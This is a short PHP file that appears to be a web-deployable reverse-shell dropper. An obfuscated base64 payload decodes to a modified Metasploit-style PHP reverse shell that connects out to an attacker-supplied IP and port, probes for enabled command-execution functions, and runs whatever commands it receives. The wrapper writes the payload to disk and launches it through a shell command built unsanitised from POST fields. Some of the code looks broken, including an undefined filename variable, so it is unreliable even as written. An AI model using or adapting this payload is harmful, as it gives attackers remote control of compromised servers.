<?php
function exec_method($cmd) {
	$retval = true;
	ob_start(); 
	passthru($cmd); 
	$ret_exec=ob_get_contents(); 
	ob_end_clean();
	return $retval;
}

$php_rev = 'IyEvdXNyL2Jpbi9waHAKPD9waHAKLyogCktudWxsJ3MgbW9kaWZpZWQgYG1zZnBheWxvYWQgcGhw
L3JldmVyc2VfcGhwIExIT1NUPVguWC5YLlggUmBgCiovCgppZiAoJGFyZ2MgPT09IDMpIHsKCgkk
aXBhZGRyPSRhcmd2WzFdOwoJJHBvcnQ9JGFyZ3ZbMl07CgkJCglAc2V0X3RpbWVfbGltaXQoMCk7
IEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7
CgkkZGY9QGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CglpZighZW1wdHkoJGRmKSl7CgkJ
JGRmPXByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJGRpcyk7CgkJJGRmPWV4cGxvZGUoJywn
LCAkZGlzKTsKCQkkZGY9YXJyYXlfbWFwKCd0cmltJywgJGRpcyk7Cgl9ZWxzZXsKCQkkZGY9YXJy
YXkoKTsKCX0KCQkJCgoJaWYoIWZ1bmN0aW9uX2V4aXN0cygnY2V4ZScpKXsKCQlmdW5jdGlvbiBj
ZXhlKCRjKXsKCQkJZ2xvYmFsICRkZjsKCQkJCgkJaWYgKEZBTFNFICE9PSBzdHJwb3Moc3RydG9s
b3dlcihQSFBfT1MpLCAnd2luJyApKSB7CgkJCSRjPSRjLiIgMj4mMVxuIjsKCQl9CgkJJGlzYz0n
aXNfY2FsbGFibGUnOwoJCSRpc2E9J2luX2FycmF5JzsKCQkKCQlpZigkaXNjKCdzeXN0ZW0nKWFu
ZCEkaXNhKCdzeXN0ZW0nLCRkZikpewoJCQlvYl9zdGFydCgpOwoJCQlzeXN0ZW0oJGMpOwoJCQkk
bz1vYl9nZXRfY29udGVudHMoKTsKCQkJb2JfZW5kX2NsZWFuKCk7CgkJfWVsc2UKCQlpZigkaXNj
KCdwb3BlbicpYW5kISRpc2EoJ3BvcGVuJywkZGYpKXsKCQkJJGZwPXBvcGVuKCRjLCdyJyk7CgkJ
CSRvPU5VTEw7CgkJCWlmKGlzX3Jlc291cmNlKCRmcCkpewoJCQkJd2hpbGUoIWZlb2YoJGZwKSl7
CgkJCQkJJG8uPWZyZWFkKCRmcCwxMDI0KTsKCQkJCX0KCQkJfQoJCQlAcGNsb3NlKCRmcCk7CgkJ
fWVsc2UKCQlpZigkaXNjKCdwcm9jX29wZW4nKWFuZCEkaXNhKCdwcm9jX29wZW4nLCRkZikpewoJ
CQkkaGFuZGxlPXByb2Nfb3BlbigkYyxhcnJheShhcnJheShwaXBlLCdyJyksYXJyYXkocGlwZSwn
dycpLGFycmF5KHBpcGUsJ3cnKSksJHBpcGVzKTsKCQkJJG89TlVMTDsKCQkJd2hpbGUoIWZlb2Yo
JHBpcGVzWzFdKSl7CgkJCQkkby49ZnJlYWQoJHBpcGVzWzFdLDEwMjQpOwoJCQl9CgkJCUBwcm9j
X2Nsb3NlKCRoYW5kbGUpOwoJCX1lbHNlCgkJaWYoJGlzYygnZXhlYycpYW5kISRpc2EoJ2V4ZWMn
LCRkZikpewoJCQkkbz1hcnJheSgpOwoJCQlleGVjKCRjLCRvKTsKCQkJJG89am9pbihjaHIoMTAp
LCRvKS5jaHIoMTApOwoJCX1lbHNlCgkJaWYoJGlzYygncGFzc3RocnUnKWFuZCEkaXNhKCdwYXNz
dGhydScsJGRmKSl7CgkJCW9iX3N0YXJ0KCk7CgkJCXBhc3N0aHJ1KCRjKTsKCQkJJG89b2JfZ2V0
X2NvbnRlbnRzKCk7CgkJCW9iX2VuZF9jbGVhbigpOwoJCX1lbHNlCgkJaWYoJGlzYygnc2hlbGxf
ZXhlYycpYW5kISRpc2EoJ3NoZWxsX2V4ZWMnLCRkZikpewoJCQkkbz1zaGVsbF9leGVjKCRjKTsK
CQl9ZWxzZQoJCXsKCQkJJG89MDsKCQl9CgkKCQkJcmV0dXJuICRvOwoJCX0KCX0KCSRub2Z1bmNz
PSdubyBleGVjIGZ1bmN0aW9ucyc7CglpZihpc19jYWxsYWJsZSgnZnNvY2tvcGVuJylhbmQhaW5f
YXJyYXkoJ2Zzb2Nrb3BlbicsJGRmKSl7CgkJJHM9QGZzb2Nrb3BlbigkaXBhZGRyLCRwb3J0KTsK
CQl3aGlsZSgkYz1mcmVhZCgkcywyMDQ4KSl7CgkJCSRvdXQgPSAnJzsKCQkJaWYoc3Vic3RyKCRj
LDAsMykgPT0gJ2NkICcpewoJCQkJY2hkaXIoc3Vic3RyKCRjLDMsLTEpKTsKCQkJfSBlbHNlIGlm
IChzdWJzdHIoJGMsMCw0KSA9PSAncXVpdCcgfHwgc3Vic3RyKCRjLDAsNCkgPT0gJ2V4aXQnKSB7
CgkJCQlicmVhazsKCQkJfWVsc2V7CgkJCQkkb3V0PWNleGUoc3Vic3RyKCRjLDAsLTEpKTsKCQkJ
CWlmKCRvdXQ9PT1mYWxzZSl7CgkJCQkJZndyaXRlKCRzLCRub2Z1bmNzKTsKCQkJCQlicmVhazsK
CQkJCX0KCQkJfQoJCQlmd3JpdGUoJHMsJG91dCk7CgkJfQoJCWZjbG9zZSgkcyk7Cgl9ZWxzZXsK
CQkkcz1Ac29ja2V0X2NyZWF0ZShBRl9JTkVULFNPQ0tfU1RSRUFNLFNPTF9UQ1ApOwoJCUBzb2Nr
ZXRfY29ubmVjdCgkcywkaXBhZGRyLCRwb3J0KTsKCQlAc29ja2V0X3dyaXRlKCRzLCJzb2NrZXRf
Y3JlYXRlIik7CgkJd2hpbGUoJGM9QHNvY2tldF9yZWFkKCRzLDIwNDgpKXsKCQkJJG91dCA9ICcn
OwoJCQlpZihzdWJzdHIoJGMsMCwzKSA9PSAnY2QgJyl7CgkJCQljaGRpcihzdWJzdHIoJGMsMywt
MSkpOwoJCQl9IGVsc2UgaWYgKHN1YnN0cigkYywwLDQpID09ICdxdWl0JyB8fCBzdWJzdHIoJGMs
MCw0KSA9PSAnZXhpdCcpIHsKCQkJCWJyZWFrOwoJCQl9ZWxzZXsKCQkJCSRvdXQ9Y2V4ZShzdWJz
dHIoJGMsMCwtMSkpOwoJCQkJaWYoJG91dD09PWZhbHNlKXsKCQkJCQlAc29ja2V0X3dyaXRlKCRz
LCRub2Z1bmNzKTsKCQkJCQlicmVhazsKCQkJCX0KCQkJfQoJCQlAc29ja2V0X3dyaXRlKCRzLCRv
dXQsc3RybGVuKCRvdXQpKTsKCQl9CgkJQHNvY2tldF9jbG9zZSgkcyk7Cgl9Cn0gZWxzZSB7CiAg
ICAgICAgZWNobyAndXNhZ2U6ICcgLiAkYXJndlswXSAuICcgcG9ydCcgLiAiXG4iOwp9Cgo/Pgo=
';

@$fh=fopen($uniqfn,"wb+");
@fwrite($fh,base64_decode($php_rev));
@fclose($fh);
$command = 'php '. $_POST['ip'] . ' ' . $_POST['port'] . ' > /dev/null &';
exec_method($command);	
?>